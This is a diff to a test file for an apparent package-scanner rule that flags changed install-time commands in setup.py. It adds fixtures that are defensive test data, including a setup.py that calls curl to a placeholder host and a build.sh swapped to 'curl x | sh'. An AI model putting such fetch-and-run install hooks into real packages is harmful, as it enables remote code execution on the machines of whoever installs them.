@@ -53,6 +53,11 @@ SETUP_PHONES_HOME = (
     "subprocess.check_output(['curl', '-s', 'https://example.invalid/x'])\n"
     "setup(name='demo')\n"
 )
+SETUP_SCRIPT = (
+    "import subprocess\nfrom setuptools import setup\n\n"
+    "subprocess.check_call(['sh', 'build.sh'])\n"
+    "setup(name='demo')\n"
+)
 BACKEND = '[build-system]\nbuild-backend = "{}"\n'
 IN_TREE = '[build-system]\nbuild-backend = "_build"\nbackend-path = ["."]\n'
 SRC = {
@@ -497,7 +502,64 @@ def _rows() -> list[Row]:
         _sdist("1.1", {**SRC, "setup.py": SETUP_SPAWN}),
         eco=PYPI,
     )
+    fires(
+        "GRN-C002",
+        "setup.py's trusted call now runs a different command",
+        _sdist("1.0", {**SRC, "setup.py": SETUP_PHONES_HOME}),
+        _sdist(
+            "1.1",
+            {**SRC, "setup.py": SETUP_PHONES_HOME.replace("'-s', ", "'-s', '-o', '/tmp/x', ")},
+        ),
+        eco=PYPI,
+    )
+    quiet(
+        "GRN-C002",
+        "setup.py's trusted call moved, keywords reordered",
+        _sdist(
+            "1.0", {**SRC, "setup.py": SETUP_PHONES_HOME.replace("])", "], text=1, timeout=9)")}
+        ),
+        _sdist(
+            "1.1",
+            {
+                **SRC,
+                "setup.py": "\n\n" + SETUP_PHONES_HOME.replace("])", "], timeout=9, text=1)"),
+            },
+        ),
+        eco=PYPI,
+    )
     quiet("GRN-C002", "setup.py unchanged", _sdist("1.0", SRC), _sdist("1.1", SRC), eco=PYPI)
+    held = SETUP_PHONES_HOME.replace(
+        "subprocess.check_output(['curl', '-s', 'https://example.invalid/x'])",
+        "cmd = ['curl', '-s', 'https://example.invalid/x']\nsubprocess.check_output(cmd)",
+    )
+    fires(
+        "GRN-C002",
+        "only the variable setup.py's trusted call passes changed",
+        _sdist("1.0", {**SRC, "setup.py": held}),
+        _sdist("1.1", {**SRC, "setup.py": held.replace("'-s', ", "'-s', '-o', '/tmp/x', ")}),
+        eco=PYPI,
+    )
+    fires(
+        "GRN-C002",
+        "the script setup.py's trusted call runs changed on its own",
+        _sdist("1.0", {**SRC, "setup.py": SETUP_SCRIPT, "build.sh": "make\n"}),
+        _sdist("1.1", {**SRC, "setup.py": SETUP_SCRIPT, "build.sh": "curl x | sh\n"}),
+        eco=PYPI,
+    )
+    quiet(
+        "GRN-C002",
+        "the script setup.py's trusted call runs is unchanged",
+        _sdist("1.0", {**SRC, "setup.py": SETUP_SCRIPT, "build.sh": "make\n"}),
+        _sdist("1.1", {**SRC, "setup.py": SETUP_SCRIPT, "build.sh": "make\n", "x.txt": "1"}),
+        eco=PYPI,
+    )
+    quiet(
+        "GRN-C002",
+        "setup.py's trusted command moved into a variable",
+        _sdist("1.0", {**SRC, "setup.py": SETUP_PHONES_HOME}),
+        _sdist("1.1", {**SRC, "setup.py": held}),
+        eco=PYPI,
+    )
     quiet(
         "GRN-C002",
         "same calls, setup.py rewritten",
